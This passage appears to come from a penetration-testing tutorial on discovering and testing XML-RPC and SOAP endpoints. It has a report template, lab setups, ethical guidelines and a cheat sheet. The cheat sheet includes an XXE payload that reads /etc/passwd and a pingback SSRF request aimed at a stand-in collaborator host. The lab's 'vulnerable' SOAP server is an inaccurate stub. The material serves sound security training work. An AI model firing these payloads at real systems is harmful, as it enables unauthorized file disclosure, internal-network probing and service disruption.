- **38-Acquisition-Target-Analysis** — Legacy SOAP/XML-RPC endpoints are common in acquired companies and represent hidden attack surface
- **39-Subsidiary-Asset-Mapping** — Subsidiary organizations often run older technology stacks with XML-RPC/SOAP enabled
- **40-Regional-Infrastructure-Mapping** — SOAP services are common in regional enterprise deployments; WSDL endpoints vary by region

### Workflow Integration

```
Reconnaissance Pipeline:
1. 21-Subdomain-Discovery → Find all subdomains
2. 23-Web-Application-Fingerprinting → Identify CMS/framework
3. 31-XML-RPC-and-SOAP-Discovery → Discover and test XML endpoints
4. 28-API-Endpoint-Discovery → Map full API surface
5. 36-Competitor-Analysis → Compare XML-RPC/SOAP exposure with competitors
```

---

## Reporting Template

### Finding: XML-RPC/SOAP [Vulnerability Type]

**Severity:** [Critical/High/Medium/Low]

**Description:**
The target application exposes an XML-RPC/SOAP endpoint at `[URL]` that is vulnerable to `[vulnerability type]`. This allows an attacker to `[impact description]`.

**Evidence:**
```
Request:
POST /xmlrpc.php HTTP/1.1
Host: TARGET
Content-Type: text/xml

[payload]

Response:
[response]

Steps to Reproduce:
1. Send POST request to [URL] with Content-Type: text/xml
2. Include the following XML payload: [payload]
3. Observe [vulnerable behavior]
```

**Impact:** [Detailed impact explanation]

**Remediation:**
- [Specific fix recommendation]
- [Alternative approach if applicable]
- [Security control recommendation]

**References:**
- [CWE reference]
- [OWASP reference]
- [Related CVE if applicable]

---

## Practice Labs

### Lab 1: DVWP (Damn Vulnerable WordPress)

```bash
# Setup
docker pull citizenstig/dvwp
docker run -d -p 8080:80 citizenstig/dvwp

# Test XML-RPC
curl -X POST http://localhost:8080/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```

### Lab 2: WebGoat SOAP Challenge

```bash
# Setup WebGoat with SOAP modules
docker pull webgoat/webgoat
docker run -d -p 8080:8080 -p 9090:9090 webgoat/webgoat

# Access SOAP challenges at http://localhost:8080/WebGoat
```

### Lab 3: Custom SOAP Lab

```python
# Create a vulnerable SOAP server for practice
from spyne import Application, Service, Unicode, Integer
from spyne.protocol.soap import Soap11
from spyne.server.wsgi import WsgiApplication
from wsgiref.simple_server import make_server

class VulnerableService(Service):
    def GetUser(self, user_id):
        # Intentionally vulnerable to SQL injection
        return f"User {user_id} data"

application = Application([VulnerableService],
    tns='vulnerable.soap',
    in_protocol=Soap11(),
    out_protocol=Soap11())

wsgi_app = WsgiApplication(application)
server = make_server('0.0.0.0', 8000, wsgi_app)
print("SOAP server running on port 8000")
server.serve_forever()
```

---

## Ethical Guidelines

1. **Scope verification** — XML-RPC and SOAP endpoints must be within the authorized testing scope. Verify with program owner before testing.

2. **Rate limiting** — XML-RPC multicall and brute force testing generates high server load. Implement strict rate limits and do not exceed 10 requests per second unless explicitly authorized.

3. **SSRF responsible disclosure** — If pingback SSRF is discovered, do not probe internal networks beyond what is necessary to demonstrate the vulnerability. Document the finding without mapping the entire internal infrastructure.

4. **No credential harvesting** — Brute force testing should use known test credentials or self-controlled accounts. Do not attempt to crack real user passwords.

5. **DDoS prevention** — Large multicall payloads can cause service disruption. Test with small payloads first and only escalate if necessary to demonstrate impact.

6. **WSDL information disclosure** — While WSDL files are publicly accessible, do not share or publish WSDL content containing internal information in public reports without redaction.

7. **SOAP injection testing** — Use read-only operations when testing for injection. Avoid write operations unless specifically authorized to prevent data corruption.

8. **XML bomb prevention** — Never test billion laughs or entity expansion attacks against production systems. These can cause immediate denial of service.

9. **Documentation** — Document all testing activities including timestamps, payloads sent, and responses received for audit trail purposes.

10. **Coordination** — If critical vulnerabilities are discovered (especially SSRF to internal networks or authentication bypass), coordinate disclosure with the target organization immediately.

---

## Quick Reference Cheat Sheet

### XML-RPC Endpoints
```
/xmlrpc.php          - WordPress standard
/xmlrpc              - Generic XML-RPC
/RPC2                - XML-RPC default
/XMLRPC              - Alternative case
/xmlrpc.cgi          - CGI-based
```

### SOAP Endpoints
```
/?wsdl               - WSDL discovery
/soap                - SOAP endpoint
/Service.asmx        - .NET SOAP
/services            - Common SOAP path
/api/soap            - API versioned SOAP
```

### Essential Commands
```bash
# List XML-RPC methods
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' URL/xmlrpc.php

# Get WSDL
curl URL/?wsdl

# Test XXE
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>&xxe;</methodName></methodCall>' URL/xmlrpc.php

# SSRF test
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://COLLAB.net</string></value></param><param><value><string>https://TARGET/</string></value></param></params></methodCall>' URL/xmlrpc.php
```

### Key Methods (WordPress XML-RPC)
```
system.listMethods          - List all methods
system.methodHelp           - Get method documentation
wp.getUsersBlogs            - Authenticate user
wp.getAuthors               - List users
wp.getProfile               - Get user profile
pingback.ping               - SSRF vector
system.multicall            - Amplification vector
```

### SOAP Namespaces
```xml
SOAP 1.1: http://schemas.xmlsoap.org/soap/envelope/
SOAP 1.2: http://www.w3.org/2003/05/soap-envelope
WSDL 1.1: http://schemas.xmlsoap.org/wsdl/
WSDL 1.2: http://www.w3.org/ns/wsdl
```

---

*Document Version: 1.0 | Last Updated: 2026 | Author: Recon Deep Dive Series*
